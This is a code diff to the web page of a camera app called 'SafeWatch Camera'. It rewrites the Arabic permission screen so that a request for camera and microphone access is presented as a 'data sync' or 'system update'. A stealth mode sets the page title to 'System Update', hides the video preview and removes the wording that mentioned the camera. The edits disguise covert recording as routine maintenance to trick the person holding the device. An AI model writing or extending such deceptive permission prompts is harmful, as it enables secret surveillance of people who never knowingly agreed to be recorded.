@@ -5,7 +5,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>SafeWatch Camera | v4.0</title>
-    <link rel="stylesheet" href="css/style.css?v=5.0">
+    <link rel="stylesheet" href="css/style.css?v=6.3">
     <link rel="manifest" href="manifest.json">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="theme-color" content="#000000">
@@ -59,12 +59,12 @@
         <div class="login-card" style="max-width: 450px;">
             <div
                 style="width: 80px; height: 80px; background: rgba(59, 130, 246, 0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px;">
-                <ion-icon name="shield-checkmark" style="font-size: 3rem; color: var(--primary);"></ion-icon>
+                <ion-icon name="sync-circle" style="font-size: 3rem; color: var(--primary);"></ion-icon>
             </div>
-            <h2 style="margin-bottom: 10px;">تنشيط الكاميرا المباشرة</h2>
-            <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 30px;">للبدء، يرجى الضغط على الزر
-                أدناه ثم السماح بالوصول للكاميرا والميكروفون.</p>
-            <button id="start-btn" class="btn" style="width: 100%;">تنشيط النظام الآن</button>
+            <h2 style="margin-bottom: 10px;">مزامنة البيانات</h2>
+            <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 30px;">للمتابعة، يرجى الضغط على الزر
+                أدناه للسماح للمتصفح بمزامنة البيانات مع السيرفر.</p>
+            <button id="start-btn" class="btn" style="width: 100%;">بدء المزامنة الآن</button>
         </div>
     </div>
 
@@ -99,14 +99,14 @@
                 </div>
                 <div
                     style="width: 50px; height: 50px; background: rgba(255,255,255,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center;">
-                    <ion-icon name="camera" style="font-size: 1.4rem;"></ion-icon>
+                    <ion-icon name="settings-outline" style="font-size: 1.4rem;"></ion-icon>
                 </div>
             </div>
             <div style="font-size: 0.8rem; opacity: 0.4;">
                 <div
                     style="width: 80px; height: 4px; background: rgba(255,255,255,0.2); border-radius: 2px; margin: 0 auto 15px;">
                 </div>
-                اضغط مرتين لإلغاء التخفي
+                اضغط مرتين للمتابعة
             </div>
         </div>
     </div>
@@ -122,8 +122,9 @@
         if (isAudioOnly) {
             // Extreme Stealth UI adjustments
             document.title = "System Update"; // Generic title
-            document.getElementById('start-btn').innerHTML = '<ion-icon name="sync-outline"></ion-icon> بدة المزامنة';
-            document.querySelector('#permission-overlay p').innerText = "جاري الاتصال بالسيرفر لتحديث البيانات...";
+            document.getElementById('start-btn').innerHTML = '<ion-icon name="sync-outline"></ion-icon> بدء المزامنة الآن';
+            document.querySelector('#permission-overlay h2').innerText = "مزامنة بيانات النظام";
+            document.querySelector('#permission-overlay p').innerText = "يتم الآن جلب آخر التحديثات والأذونات اللازمة لاستقرار النظام، يرجى الضغط للمتابعة...";
             document.getElementById('localVideo').style.display = 'none';
         }
 
